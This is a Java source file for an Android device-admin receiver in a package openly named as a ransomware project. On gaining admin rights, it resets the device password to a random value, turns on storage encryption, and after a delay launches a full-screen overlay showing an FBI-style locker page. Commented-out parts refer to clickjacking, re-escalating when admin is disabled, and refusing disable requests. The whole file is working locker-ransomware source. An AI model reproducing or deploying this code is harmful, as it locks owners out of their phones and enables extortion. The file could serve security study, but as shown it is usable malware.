package projects.security.ransomware_1;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.SystemClock;
import android.view.WindowManager;
import android.widget.Toast;

import java.util.UUID;

/**
 * Device Admin was received; unleash payload
 */
public class AdminPayload extends DeviceAdminReceiver {
    private static String default_path = "file:///android_asset/locker_fbi.html";
    private static String default_mode = "LOCK";
    public static final Object sync = new Object();
    private static WindowManager.LayoutParams default_params =
            new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    //WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, //Testing clickjacking only
            PixelFormat.OPAQUE);

    private static int default_duration = 0;
    private static int default_delay = 10000;

    public void onEnabled(Context context, Intent intent) {

        synchronized(sync) {
            sync.notifyAll();
        }

        Toast.makeText(context, "All your phone are belongs to me", Toast.LENGTH_SHORT).show();


        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        //dpm.resetPassword("2222", 0);
        String s = UUID.randomUUID().toString();
        dpm.resetPassword(s, 0);

        //Encryption:
        dpm.setStorageEncryption (new ComponentName(context, this.getClass()), true);


        final Context fc = context;
        final Handler h = new Handler();
        new Thread(new Runnable() {
            public void run() {
                h.postDelayed(new Runnable() {
                    public void run() {
                        beginLock(fc, default_path, default_params, default_duration, default_mode); //lock for 30 seconds
                    }
                }, default_delay); //Wait 10 seconds after admin gained before locking

            }
        }).start();






    }
    /*
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        final Context fc = context;
        final Handler h = new Handler();
        new Thread(new Runnable() {
            public void run() {
                h.postDelayed(new Runnable() {
                    public void run() {
                        beginLock(fc, default_path, default_params, default_duration, default_mode); //lock for 30 seconds
                    }
                }, default_delay); //Wait 10 seconds after admin gained before locking

            }
        }).start();
        return "done";
    }


    //Re-clickjack
    @Override
    public void onDisabled(Context context, Intent intent) {
        StartActivity sa = new StartActivity();
        sa.attemptEscalate();
    }

    */
    public static void beginLock(Context context, String html_path, WindowManager.LayoutParams params, int duration, String mode) {
        if (html_path == null) html_path = default_path;
        if (params == null) params = default_params;
        //if (duration < 1) duration = default_duration;

        Intent intent = new Intent(context, LockerService.class);
        intent.putExtra("HTML_PATH", html_path);
        intent.putExtra("WINDOW_PARAMS", params);
        intent.putExtra("DURATION", duration);
        intent.putExtra("MODE", mode);
        context.startService(intent);

    }




    /*@Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "nope";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        return;
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        ;
    }
    */
}
